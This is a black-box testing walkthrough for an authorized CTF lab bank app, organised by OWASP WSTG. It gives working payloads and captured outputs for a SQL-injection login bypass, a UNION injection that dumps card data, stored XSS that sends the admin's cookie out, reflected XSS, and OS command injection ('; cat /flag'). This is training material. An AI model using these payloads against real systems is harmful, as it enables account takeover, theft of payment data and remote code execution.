# Danubius Bank — tester's methodology walkthrough

> **Authorized training target.** This guide teaches *how a black-box tester
> actually finds and confirms* each flaw — every request, every observed response,
> every inference — assuming **no access to the source code**. It follows the
> **OWASP Web Security Testing Guide (WSTG)** loop. For terse payloads and the
> automated checks see [WALKTHROUGH.md](WALKTHROUGH.md); for setup/access see its
> "Start and access" section. Flags are demo values (`RPC{...}`). The command
> outputs below are **captured from the live app**, lightly trimmed for width.

## The method (applied to every task)

Testing is a loop, not a lookup:

1. **Recon & map** (WSTG-INFO) — walk the app, list every input that reaches the
   backend, and note what each feature *probably does* server-side.
2. **Hypothesize** — from the feature, guess the sink (a DB query? a shell? HTML
   output? a privileged viewer?) and the vulnerability class it invites.
3. **Baseline** — send normal input and record the normal response. You can only
   recognise an anomaly against a known-good baseline.
4. **Probe** — send *one* crafted token at a time and watch what changes (status,
   error text, reflected content, timing, an out-of-band callback).
5. **Reason** — what does that change prove about the backend?
6. **Confirm** — a deterministic test that removes doubt.
7. **Exploit** — the minimal payload that turns the confirmed flaw into impact.
8. **Assess impact.**

**Tooling.** A browser for feel; **Burp Suite**/ZAP as an intercepting proxy to
read, edit and replay every request (Repeater); `curl` to script. Below, each
request is shown as the input you send and the app's real reply.

Each task is tagged with its **WSTG** id and **OWASP Top-10** category and ends
with a graduated **hint ladder** (H1→H3) for CTFd.

---

# Week 1 — the web application

You reach the bank *after* the access gate (a player login fronting the lab — see
WALKTHROUGH.md). For SQLi tasks you also need a bank session; the very first flaw
(W1-01) gives you one, or you can register.

## W1-01 — Authentication bypass via SQL injection
`WSTG-ATHN-04` / `WSTG-INPV-05` · OWASP **A03: Injection** · `POST /login`

**Recon.** A login form (`username`, `password`). Logins almost always run a DB
lookup like `SELECT … WHERE username=? AND password=?`. Two things to test: can I
*inject* (INPV-05) and can I *bypass the auth* (ATHN-04)?

**Baseline.** `username=nonexistent`, `password=x`:
```
Invalid credentials.
```
That's the honest "no match" answer — remember it.

**Probe — send one quote.** A `'` ends a SQL string literal; if the input isn't
parameterized it will break the query. `username='`, `password=x`:
```
unterminated ... string literal at or near "x'"
LINE 1: ...SELECT id FROM clients WHERE username = ''' AND password = 'x'
                                                                       ^
```
**Reason.** This is *not* "Invalid credentials" — it's a **database error**, and
it prints the **actual query**:
`SELECT id FROM clients WHERE username = '<username>' AND password = '<password>'`.
So (a) my input lands in SQL unescaped, and (b) I now know exactly what to subvert:
my username is inside `'…'`, ANDed with the password check.

**Craft the bypass.** Make the `WHERE` true without a password: close the string,
add an always-true `OR`, comment the rest with `-- `:
```
username = ' OR '1'='1'-- 
password = x
```
→ effective query `… WHERE username = '' OR '1'='1'-- ' AND password = 'x'`
(`'1'='1'` always true; `-- ` kills the password check).

**Confirm (real).** That submit returns **HTTP 302 → /dashboard** = you're logged
in (as the first row, client 1). Want a *specific* user? `username = admin'-- `
→ `… WHERE username = 'admin'-- …` → logs in as **admin**. Both verified (302).

**Impact.** Full authentication bypass — become any user, incl. admin, no password.
It's also your session for the rest of Week 1.

**Flag.** On the dashboard you land on (client 1).

**Hints.** H1: the login queries a DB — what if the username holds a SQL
metacharacter? · H2: one `'` errors and prints the query; your input is inside
`'…'`. · H3: `' OR '1'='1'-- `.

## W1-02 — UNION SQL injection → full database read
`WSTG-INPV-05` · OWASP **A03: Injection** · `GET /transactions?q=` (needs a bank session)

The point the quick guide skipped: **you don't know the tables or columns.** Here
is the whole discovery, black-box.

**Recon.** A transaction search that prints matches in a 4-column table:
`Counterparty | Amount | Note | Direction`. A DB-backed search that *reflects
rows* is the ideal **UNION** target — if injectable, you append your own SELECT
and read its output straight from the table.

**Baseline.** `q=Tesco` → your matching transactions (e.g. `Tesco Stores SR | -45.90 | groceries | out`). Normal.

**Probe 1 — break syntax.** `q='`:
```
unterminated quoted string at or near "' ORDER BY ts DESC"
LINE 1: ...WHERE account_id = 1 AND counterparty ILIKE '%'%' ORDER BY ts DESC
                                                          ^
```
**Reason.** Injectable, and the error hands me the query tail:
`… counterparty ILIKE '%<q>%' ORDER BY ts DESC`. My input sits inside `'%…%'`. So
every payload will start with `'` (close the string) and end with `-- ` (comment
out the trailing `%' ORDER BY ts DESC`).

**Probe 2 — how many columns?** A UNION must match the column count. Two
independent ways, both confirmed live:

| Payload (`q=`) | Response | Inference |
|---|---|---|
| `' ORDER BY 4-- ` | rows returned | ≥ 4 columns |
| `' ORDER BY 5-- ` | `ORDER BY position 5 is not in select list` | < 5 → **exactly 4** |
| `' UNION SELECT NULL-- ` | `each UNION query must have the same number of columns` | column count ≠ 1 |
| `' UNION SELECT NULL,NULL,NULL,NULL-- ` | extra blank row appears | **4** confirmed |

**Probe 3 — which column shows, and what DBMS?**
`q=' UNION SELECT version(),NULL,NULL,NULL-- ` → a new row in the table:
```
PostgreSQL 16.15 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) ...
```
**Reason.** Column 1 is rendered (put loot there) and the DBMS is **PostgreSQL**,
so I'll map the schema via `information_schema`. Quick bonus:
`q=' UNION SELECT current_database(),current_user,NULL,NULL-- ` → `danubius | danubius`.

**Probe 4 — enumerate tables** (you do *not* know them yet):
```
' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public'-- 
```
Real rows (interleaved with your own transactions):
```
accounts
clients
transactions
cards        ← a bank's card table: the prize
```

**Probe 5 — enumerate that table's columns** (still no guessing):
```
' UNION SELECT column_name,data_type,NULL,NULL FROM information_schema.columns WHERE table_name='cards'-- 
```
Real:
```
card_number | text      cvv        | text     card_holder | text
expiry      | text      status     | text     is_vip      | boolean
card_type   | text      account_id | integer  id          | integer
```
Now the exact column names and types are known — no `SELECT *` guesswork.

**Exploit — dump the cards:**
```
' UNION SELECT card_number,expiry,card_holder,status FROM cards-- 
```
Real output (injected rows interleaved with your transactions):
```
5355982144770520          | 07/26 | EVA TOMASOVA     | active
4917556120431179          | 01/25 | JAN NOVAK        | blocked
4917556120438811          | 08/27 | JAN NOVAK        | active
RPC{4917_4500_1200_6710}  | 11/28 | PETER KOVAC      | active   ← VIP card = flag
5355982144770290          | 03/26 | MARIA HORVATHOVA | active
```
**Reason.** Ordering is arbitrary (you commented out `ORDER BY ts`), so the
injected rows sit *between* your real ones — spot the rows that don't look like
transactions. The VIP holder's card number is the flag. (You could just as easily
add `cvv` → full PAN **and** CVV disclosure.)

**Impact.** Read any table/column in the database — cards (incl. CVV), clients
(usernames, roles), everything.

**Flag.** `RPC{4917_4500_1200_6710}`.

**Hints.** H1: the search prints DB rows — could you append *your own* rows? ·
H2: confirm with `'`, count columns with `ORDER BY N`, fingerprint with
`version()`, then read `information_schema.tables` / `.columns`. · H3:
`' UNION SELECT card_number,expiry,card_holder,status FROM cards-- `.

## W1-03 — Stored (blind) XSS → admin session theft
`WSTG-INPV-02` · OWASP **A03: Injection (XSS)** · `/transfer` *Note* field

**Recon.** The transfer form has a free-text **note**, and there is a **"Report to
admin for review"** action. That second part is the tell: a *more privileged* user
(the admin) will later **view your note**. Stored input rendered to another user =
**stored XSS**, and because you never see the admin's screen it's **blind**.

**Hypothesis.** If the admin's view doesn't output-encode the note, JavaScript you
store runs in the *admin's* session. You have **no admin access and don't need it**
— you make the admin's browser leak its own cookie. (An attacker who could just
log in as admin wouldn't bother; the whole point is that you can't.)

**Test out-of-band.** Blind XSS gives no feedback in *your* page, so make the
payload **call back** to a listener you control (real world: your server / Burp
Collaborator; the lab provides `/w1-03/collect/<token>`). Store this as the note:
```html
<script>fetch('/w1-03/collect/demoTOK?c='+document.cookie)</script>
```
- Submit → *"Transfer #20 created"*.
- Check your collector **before** reporting → `/w1-03/collect/demoTOK` → empty.
- Click **Report to admin** (`/w1-03/report/20`).
- Check your collector **after** → real captured value:
```
session=admin-danubka; flag=RPC{demo_w1_03_stored_xss_admin_cookie}
```
**Reason.** The callback fired only after the admin "viewed" the note → your script
executed **in the admin's browser** → stored XSS confirmed, and the exfiltrated
cookie carries the flag. Had the note been escaped, the collector would stay empty.

**Reason about the trigger.** "Report to admin" makes the victim render your note.
Here the admin is an **emulated bot** (server-side it renders the note exactly as
the admin page does and "runs" anything in an unescaped `<script>`/`on…=`) — no
headless browser, and it scales to many concurrent players, each isolated by token.

**Impact.** Privileged-session hijack → admin account takeover.

**Hints.** H1: who else reads your note, and is it escaped? · H2: you won't see it
yourself — make it phone home to a collector, then Report to admin. · H3:
`<script>fetch('/w1-03/collect/<token>?c='+document.cookie)</script>` → Report →
read `/w1-03/collect/<token>`.

## W1-04 — Reflected XSS (with proof-of-execution)
`WSTG-INPV-01` · OWASP **A03: Injection (XSS)** · `GET /search?q=`

**Recon.** `/search` echoes your query ("Results for: *…*"). Reflected input =
**reflected XSS**. There's no second user here — in this single-player task **you
are the victim**, exactly as a phished reflected-XSS link would run in a target.

**Baseline → probe.**

| `q=` | The page's HTML contains | Inference |
|---|---|---|
| `hello` | `hello` | reflected |
| `<b>bxss7</b>` | `<b>bxss7</b>` (renders **bold**) | reflected **unescaped** → HTML injection |
| `<img src=x onerror=alert(1)>` | `alert` fires | **JS executes** |

**Discover the proof mechanism** (how do you even know what to do next?). Landing
`alert` is not the flag — the app wants *proof the script ran in the page*. Recon:
- **View source / DevTools** on `/search`: there's `<script>window.__proof="e4abe8…"</script>`
  (a source comment notes its role). Type `window.__proof` in the console → it
  prints the value → any script on the page can read it. **Reload** → it changes
  every time → a per-page anti-replay token.
- **Probe the solve endpoint** (the objective, given in the CTFd brief):
  `GET /search/solved` with no token → **403**. With the page's token →
  `GET /search/solved?n=e4abe8…` → `RPC{demo_w1_04_reflected_xss}`, and `/search`
  then shows the flag. (All verified live.)

**Reason.** You cannot `curl` the flag — the token must be read *from the rendered
page* by an executed script. That forces a genuine XSS, not a guessed request.

**Exploit.** Inject JS that reads the token and calls the endpoint:
```html
<img src=x onerror="fetch('/search/solved?n='+window.__proof)">
```

**Impact.** Arbitrary JS in a victim's authenticated session (cookie theft, actions
on their behalf), delivered by a crafted URL.

**Hints.** H1: the page echoes your term — is it HTML-encoded? · H2: `<b>` renders,
so inject script; the flag needs proof it ran — see `window.__proof`. · H3:
`<img src=x onerror="fetch('/search/solved?n='+window.__proof)">`.

## W1-05 — OS command injection
`WSTG-INPV-12` · OWASP **A03: Injection** · `/export` *File name* field

**Recon.** Open `/export`; the form has a single input, **`name`** (GET). A feature
that "exports"/builds a file often **shells out** with your input → command-injection
candidate.

**Baseline.** `name=statement` → real output:
```
Preparing PDF statement export ...
ls: cannot access '/srv/exports/statement': No such file or directory
```
**Reason.** The app runs `ls -la /srv/exports/<name>` — it literally tries to list
your file and echoes the attempt. Your input is inside a **shell command**.

**Probe — chain a command.** `name=x; id`:
```
uid=0(root) gid=0(root) groups=0(root)
ls: cannot access '/srv/exports/x': No such file or directory
```
**Reason.** `id` ran — as **root** — so a second command executed → OS command
injection confirmed; `;` separated my command, then `ls` failed on `x`. (Other
separators worth knowing: `&&`, `|`, `` $(…) ``, backticks.)

**Exploit.** `name=x; cat /flag`:
```
RPC{demo_w1_05_os_command_injection}
```

**Impact.** Arbitrary command execution on the export host. By design that host is
an **isolated, network-less, capability-dropped container** holding only
`FLAG_W1-05`, so the blast radius is contained — but the primitive is full RCE.

**Hints.** H1: the export echoes a shell command with your file name. · H2: chain
your own with `;`/`&&`/`|` — try `; id`. · H3: `x; cat /flag`.

---

*Weeks 2–4 (REST API access-control, the LLM assistant, and the blue-team
investigation) will be written to this same black-box depth next.*
